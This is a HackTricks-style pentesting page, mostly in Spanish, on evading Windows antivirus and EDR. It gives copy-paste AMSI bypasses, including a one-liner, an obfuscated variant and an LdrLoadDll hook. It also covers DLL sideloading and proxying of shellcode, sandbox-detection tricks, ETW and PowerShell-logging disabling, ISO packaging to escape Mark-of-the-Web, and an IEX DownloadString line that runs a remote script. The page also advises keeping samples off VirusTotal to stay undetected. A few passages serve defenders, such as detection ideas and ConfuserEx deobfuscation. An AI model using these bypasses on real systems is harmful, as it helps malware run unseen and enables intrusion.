# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener Windows Defender de funcionar.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender haciéndose pasar por otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodología de evasión de AV**

Actualmente, los AVs usan diferentes métodos para comprobar si un archivo es malicioso o no: detección estática, análisis dinámico y, para los EDRs más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se consigue marcando cadenas conocidas maliciosas o arreglos de bytes en un binario o script, y también extrayendo información del propio archivo (p. ej. descripción del archivo, nombre de la compañía, firmas digitales, icono, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente ya hayan sido analizadas y marcadas como maliciosas. Hay un par de maneras de evitar este tipo de detección:

- **Encryption**

Si encriptas el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de loader para descifrar y ejecutar el programa en memoria.

- **Obfuscation**

A veces lo único que necesitas es cambiar algunas cadenas en tu binario o script para pasar el AV, pero esto puede ser una tarea que consume mucho tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena manera de comprobar la detección estática por parte de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente divide el archivo en múltiples segmentos y luego obliga a Defender a escanear cada uno de ellos individualmente; de este modo puede decirte exactamente qué cadenas o bytes están marcados en tu binario.

Te recomiendo mucho que revises esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctico.

### **Análisis dinámico**

El análisis dinámico es cuando el AV ejecuta tu binario en una sandbox y observa actividad maliciosa (p. ej. intentar descifrar y leer las contraseñas del navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser algo más complicada, pero aquí tienes algunas cosas que puedes hacer para evadir las sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una excelente manera de evadir el análisis dinámico del AV. Los AVs tienen muy poco tiempo para escanear archivos para no interrumpir el flujo de trabajo del usuario, por lo que usar sleeps largos puede dificultar el análisis de los binarios. El problema es que muchas sandboxes de AV pueden simplemente saltarse el sleep dependiendo de cómo esté implementado.

- **Checking machine's resources** Normalmente las sandboxes tienen muy pocos recursos (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo comprobando la temperatura de la CPU o incluso la velocidad de los ventiladores; no todo estará implementado en la sandbox.

- **Machine-specific checks** Si quieres dirigirte a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que especificaste; si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre del equipo de la sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro de la sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos dicho antes en esta entrada, **public tools** eventualmente **get detected**, así que deberías hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, **do you really need to use mimikatz**? ¿O podrías usar otro proyecto menos conocido que también haga un volcado de LSASS?

La respuesta correcta probablemente sea la última. Tomando mimikatz como ejemplo, probablemente sea una de las piezas de malware más marcadas, si no la más, por AVs y EDRs; aunque el proyecto en sí es muy bueno, también es una pesadilla intentar sortear los AVs con él, así que busca alternativas para lo que intentas lograr.

> [!TIP]
> Al modificar tus payloads para evasión, asegúrate de **turn off automatic sample submission** en defender, y por favor, en serio, **DO NOT UPLOAD TO VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si tu payload es detectado por un AV concreto, instálalo en una VM, intenta desactivar el envío automático de muestras, y pruébalo allí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioritize using DLLs for evasion**; en mi experiencia, los archivos DLL suelen estar **way less detected** y analizados, por lo que es un truco muy simple para evitar la detección en algunos casos (siempre que tu payload pueda ejecutarse como DLL, claro).

Como se puede ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Comparación en antiscan.me de un payload EXE normal de Havoc vs un DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** se aprovecha del orden de búsqueda de DLL usado por el loader posicionando la aplicación víctima y los payloads maliciosos uno junto al otro.

Puedes buscar programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explore DLL Hijackable/Sideloadable programs yourself**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas públicamente conocidos como DLL Sideloadable, puedes ser descubierto con facilidad.

Simplemente colocar un DLL malicioso con el nombre que un programa espera cargar no hará que cargue tu payload, ya que el programa espera funciones específicas dentro de ese DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que un programa hace desde el DLL proxy (y malicioso) al DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de tu payload.

Voy a usar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una DLL source code template y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusar de Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es un KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copy-paste):
1) Copia el DLL del sistema firmado a una carpeta escribible
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un DllMain mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para activar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Activar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamiento observado:
- `rundll32` (firmada) carga la side-by-side `keyiso.dll` (firmada)
- Mientras resuelve `KeyIsoSetAuditingInterface`, el cargador sigue el forward a `NCRYPTPROV.SetAuditingInterface`
- A continuación el cargador carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementado, obtendrás un error "missing API" solo después de que `DllMain` ya se haya ejecutado

Hunting tips:
- Focus on forwarded exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- You can enumerate forwarded exports with tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitoriza LOLBins (p. ej., rundll32.exe) que cargan DLLs firmadas desde rutas no del sistema, seguido de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Generar alertas sobre cadenas de proceso/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` en rutas escribibles por el usuario
- Aplicar políticas de integridad de código (WDAC/AppLocker) y denegar write+execute en los directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es un juego del gato y el ratón; lo que funciona hoy puede ser detectado mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Anti-Malware Scan Interface)

AMSI fue creada para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AVs solo podían escanear **archivos en disco**, por lo que si de alguna manera podías ejecutar payloads **directamente en memoria**, el AV no podía hacer nada para impedirlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevación de EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Permite a las soluciones antivirus inspeccionar el comportamiento de scripts exponiendo el contenido del script en una forma que no está encriptada ni ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script; en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aun así se nos detectó en memoria debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para la carga y ejecución en memoria. Por eso se recomienda usar versiones inferiores de .NET (como 4.7.2 o anteriores) para ejecución en memoria si quieres evadir AMSI.

Hay un par de maneras de evitar AMSI:

- **Obfuscation**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que Obfuscation podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto haya sido marcado.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutando como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forzar un error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) hará que no se inicie ningún escaneo para el proceso actual. Esto fue divulgado originalmente por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para evitar su uso generalizado.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que hizo falta fue una sola línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Esa línea, por supuesto, ha sido detectada por AMSI, por lo que se necesita alguna modificación para poder usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será detectado una vez que se publique este post, así que no deberías publicar código si tu plan es permanecer indetectado.

**Memory Patching**

Esta técnica fue inicialmente descubierta por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones que devuelvan el código E_INVALIDARG; de este modo, el resultado del escaneo real será 0, lo que se interpreta como un resultado limpio.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloqueo de AMSI evitando la carga de amsi.dll (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto y agnóstico al lenguaje es colocar un hook en user‑mode sobre `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos en ese proceso.

Esquema de implementación (x64 C/C++ pseudocódigo):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona con PowerShell, WScript/CScript y loaders personalizados por igual (cualquier cosa que de otro modo cargaría AMSI).
- Úsalo junto con alimentar scripts a través de stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos de línea de comandos largos.
- Visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` llamando a `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Eliminar la firma detectada**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## Registro de PowerShell

PowerShell logging es una característica que te permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para atacantes que quieran evadir la detección**.

Para evitar el registro de PowerShell, puedes usar las siguientes técnicas:

- **Desactivar PowerShell Transcription y Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar PowerShell versión 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto: `powershell.exe -version 2`
- **Usar una sesión de PowerShell no gestionada (Unmanaged)**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para lanzar un powershell sin defensas (esto es lo que usa `powerpick` de Cobalt Strike).

## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación se basan en cifrar datos, lo que aumentará la entropía del binario y facilitará que AVs y EDRs lo detecten. Ten cuidado con esto y quizá aplica el cifrado solo a secciones específicas de tu código que sean sensibles o necesiten ocultarse.

### Desofuscación de binarios .NET protegidos con ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común enfrentarse a varias capas de protección que bloquearán descompiladores y sandboxes. El flujo de trabajo siguiente restaura de forma fiable un IL casi original que posteriormente puede descompilarse a C# en herramientas como dnSpy o ILSpy.

1.  Eliminación de anti-tampering – ConfuserEx cifra cada *method body* y lo descifra dentro del constructor estático del *module* (`<Module>.cctor`). Esto también parchea el checksum del PE, por lo que cualquier modificación hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadata cifradas, recuperar las claves XOR y reescribir un ensamblado limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Recuperación de símbolos / flujo de control – alimenta el archivo *clean* a **de4dot-cex** (un fork de de4dot con soporte para ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – selecciona el perfil de ConfuserEx 2
• de4dot deshará el control-flow flattening, restaurará los namespaces, clases y nombres de variables originales y descifrará cadenas constantes.

3.  Eliminación de proxy-calls – ConfuserEx reemplaza llamadas directas a métodos por envoltorios ligeros (a.k.a *proxy calls*) para dificultar aún más la descompilación. Elimínalos con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones envoltorio opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy, busca grandes blobs Base64 o el uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el payload *real*. A menudo el malware lo almacena como un arreglo de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesitar ejecutar la muestra maliciosa – útil cuando trabajas en una estación sin conexión.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para triage automático de muestras.

#### Comando de una sola línea
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer una mayor seguridad de software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++ que dificultará un poco la tarea de la persona que quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 capaz de ofuscar varios archivos PE distintos, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes soportados por LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter de PE para .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier de un archivo descargado desde internet.</p></figcaption></figure>

> [!TIP]
> Es importante notar que los ejecutables firmados con un certificado de firma **confiable** **no activarán SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí hay una demostración para evadir SmartScreen empaquetando payloads dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro en Windows que permite a aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser utilizado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De forma similar a cómo AMSI es deshabilitado (bypassed), también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar ningún evento. Esto se hace parcheando la función en memoria para que retorne inmediatamente, deshabilitando efectivamente el registro ETW para ese proceso.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Cargar binarios C# en memoria es una técnica conocida desde hace tiempo y sigue siendo una excelente forma de ejecutar tus herramientas post-exploitation sin ser detectadas por AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya proporcionan la capacidad de ejecutar assemblies C# directamente en memoria, pero hay diferentes maneras de hacerlo:

- **Fork\&Run**

Implica **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese nuevo proceso, ejecutar tu código malicioso y cuando termine, matar el nuevo proceso. Esto tiene tanto beneficios como inconvenientes. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso implantado Beacon. Esto significa que si algo en nuestra acción de post-exploitation sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implant sobreviva.** El inconveniente es que tienes una **mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-exploitation **en su propio proceso**. De esta manera, puedes evitar crear un nuevo proceso y que sea analizado por AV, pero el inconveniente es que si algo sale mal con la ejecución de tu payload, hay una **mucho mayor probabilidad** de **perder tu Beacon** ya que podría colapsar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de assemblies C#, revisa este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**, revisa [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el video de S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno del intérprete instalado en la Attacker Controlled SMB share**.

Al permitir el acceso a los Interpreter Binaries y al entorno en la compartición SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repo indica: Defender aún escanea los scripts, pero al utilizar Go, Java, PHP, etc. tenemos **más flexibilidad para bypass static signatures**. Las pruebas con scripts de reverse shell aleatorios no ofuscados en estos lenguajes han demostrado ser exitosas.

## TokenStomping

